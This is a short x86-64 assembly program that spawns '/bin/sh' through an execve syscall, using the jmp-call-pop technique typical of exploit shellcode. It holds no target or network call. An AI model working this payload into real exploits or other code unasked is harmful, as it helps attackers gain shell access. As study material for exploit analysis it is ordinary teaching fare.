.section .text

.globl _start

_start:

pushq $0

jmp end

hop:
popq %rbx
pushq (%rbx)
movq $59, %rax
movq %rsp, %rdi
movq $0, %rsi
movq $0, %rdx

syscall


end:
call hop
.ascii "/bin/sh\0"
